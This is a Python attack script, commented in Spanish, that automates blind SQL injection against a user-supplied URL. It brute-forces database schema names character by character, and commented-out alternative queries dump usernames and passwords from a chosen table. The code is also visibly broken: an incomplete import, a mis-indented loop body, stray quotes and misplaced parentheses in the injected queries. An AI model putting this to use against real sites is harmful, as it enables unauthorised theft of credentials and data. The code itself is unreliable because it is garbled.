#!/usr/bin/python3

import requests # type: ignore
import signal
import sys
import time
import string
from pwn import # type: ignore

def def_handler(sig, frame):
	print("\n\n[!] Saliendo ... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = input("¿Cuál es la URL objetivo?: ")
parametro = input("¿Cuál es el parámetro? (Ejemplo: ?parametroExistente=ValorInexistente): ")
tabla = input("¿Cómo se llama la tabla que has encontrado?: ")
columna1 = input("¿Cómo se llama la columna de users que has encontrado?: ")
columna2 = input("¿Cómo se llama la columna de passwds que has encontrado?: ")
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta" )
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)
	
	p2 = log.progress("Datos extraídos")
	
	extracted_info = ""

	for position in range(1, 150): # caracteres a corregir si nos quedamos cortos 150
		for character in range(33, 126): # empezando desde el 33 hasta el 126
		sqli_url = f"{main_url}?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from {tabla} where id = 1=%d)" % (position, character)"

	#esta es la query que s ehacía an tes --> sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
	
	# Ponerle la siguiente consulta si quiro saber los usersy passwds: f"{main_url}?id=9 or (select(select ascii(substring((select group_concat({columna1}, 0x3a ,{columna2}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)"
	
	# Ponerle la siguiente consulta si quiro saber los users: f"{main_url}?id=9 or (select(select ascii(substring((select group_concat({columna1}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)
	
	# Ponerle la siguiente consulta si quiro saber las passwds: f"{main_url}?id=9 or (select(select ascii(substring((select group_concat({columna2}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)

		p1.status(sqli_url)
		
		r = requests.get(sqli_url)
		
		if r.status_code == 200:
			extracted_info += chr(character)
			p2.status(extracted_info)
			break

if __name__ == '__main__':

	makeSQLI( )